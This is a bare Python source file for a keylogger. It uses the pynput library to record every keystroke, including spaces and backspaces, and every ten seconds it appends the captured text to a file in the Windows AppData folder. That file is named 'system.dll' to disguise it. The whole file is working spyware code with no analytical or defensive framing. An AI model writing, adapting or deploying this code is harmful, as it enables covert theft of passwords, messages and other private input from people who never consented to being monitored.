import pynput, os, threading
class Keylogger:
    def __init__(self):
        self.path = os.environ["appdata"] + "\\system.dll"
        self.dump = ""
        with open(self.path, "w") as file:
            file.write("KeyloggerInfo\n")
        
        keyboard_listener = pynput.keyboard.Listener(on_press=self.get_keystrokes)
        with keyboard_listener:
            self.dump_keys()
            keyboard_listener.join()

    def get_keystrokes(self, key):
        try:
            self.dump = self.dump + str(key.char)
        except AttributeError:
            if key == key.space:
                self.dump += " "
            elif key == key.backspace:
                self.dump += " <BK> "

    def dump_keys(self):
        with open(self.path, "a") as file:
            file.write(self.dump)
            self.dump = ""
        threading.Timer(10, self.dump_keys).start()


